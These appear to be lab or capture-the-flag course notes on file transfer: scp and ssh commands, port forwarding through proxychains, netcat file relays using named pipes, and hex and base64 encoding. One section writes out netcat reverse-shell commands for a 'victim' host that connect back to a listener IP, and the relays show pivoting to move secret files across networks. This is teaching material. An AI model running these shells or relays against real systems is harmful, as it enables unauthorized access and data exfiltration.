Download a file from a remote directory to a local directory

$ scp student@172.16.82.106:secretstuff.txt /home/student

Upload a file to a remote directory from a local directory

$ scp secretstuff.txt student@172.16.82.106:/home/student

Copy a file from a remote host to a separate remote host

$ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
password:    password:

Recursive upload of a folder to remote

$ scp -r folder/ student@172.16.82.106:

Recursive download of a folder from remote

$ scp -r student@172.16.82.106:folder/ .

Download a file from a remote directory to a local directory

$ scp -P 1111 student@172.16.82.106:secretstuff.txt .

Upload a file to a remote directory from a local directory

$ scp -P 1111 secretstuff.txt student@172.16.82.106:


Create a local port forward to target device

$ ssh student@172.16.82.106 -L 1111:localhost:22 -NT

Download a file from a remote directory to a local directory

$ scp -P 1111 student@localhost:secretstuff.txt /home/student

Upload a file to a remote directory from a local directory

Create a Dynamic Port Forward to target device

$ ssh student@172.16.82.106 -D 9050 -NT

Download a file from a remote directory to a local directory

$ proxychains scp student@localhost:secretstuff.txt .

Upload a file to a remote directory from a local directory

$ proxychains scp secretstuff.txt student@localhost:

$ scp -P 1111 secretstuff.txt student@localhost:/home/student


uncommon ways
netcat/nc

    Listener (receive file):

nc -lvp 9001 > newfile.txt

    Client (sends file):

nc 172.16.82.106 9001 < file.txt
    Listener (sends file):

nc -lvp 9001 < file.txt

    Client (receive file):

nc 172.16.82.106 9001 > newfile.txt

    On Blue_Host-1 Relay:

$ mknod mypipe p
$ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe

    On Internet_Host (send):

$ nc 172.16.82.106 1111 < secret.txt

    On Blue_Priv_Host-1 (receive):

$ nc 192.168.1.1 3333 > newsecret.txt


Client - Client

    On Internet_Host (send):

$ nc -lvp 1111 < secret.txt

    On Blue_Priv_Host-1 (receive):

$ nc -lvp 3333 > newsecret.txt

    On Blue_Host-1 Relay:

$ mknod mypipe p
$ nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe

Client - Listener

    On Internet_Host (send):

$ nc -lvp 1111 < secret.txt

    On Blue_Priv_Host-1 (receive):

$ nc 192.168.1.1 3333 > newsecret.txt

    On Blue_Host-1 Relay:

$ mknod mypipe p
$ nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe
Listener - Client

    On Internet_Host (send):

$ nc 172.16.82.106 1111 < secret.txt

    On Blue_Priv_Host-1 (receive):

$ nc -lvp 3333 > newsecret.txt

    On Blue_Host-1 Relay:

$ mknod mypipe p
$ nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe

----------------------------------------------------------------------------------------
    First listen for the shell on your device. REVERSE SHELL

$ nc -lvp 9999

    On Victim using -c :

$ nc -c /bin/bash 10.10.0.40 9999

    On Victim using -e :

$ nc -e /bin/bash 10.10.0.40 9999

____________________________________________________________________________________________
    echo a string of text and use xxd to convert it to a plain hex dump with the -p switch\

$ echo "Hex encoding test" | xxd -p
48657820656e636f64696e6720746573740a

    echo hex string and use xxd to restore the data to its original format

$ echo "48657820656e636f64696e6720746573740a" | xxd -r -p
Hex encoding test


Base64:
base64 -w0 logoCyber.png

nano b64image.png

paste, save & exit

    decode from base64 with -d

$ base64 -d b64image.png > logoCyber.png

File Transfer and Redirection Complete

Check intel on the CTF server for new information regarding mission tasks
10.10
Transfer file with Base64create a new file on your machine $ nano b64image.png paste, save & exit decode from base64 with -d $ base64 -d b64image.png > logoCyber.png


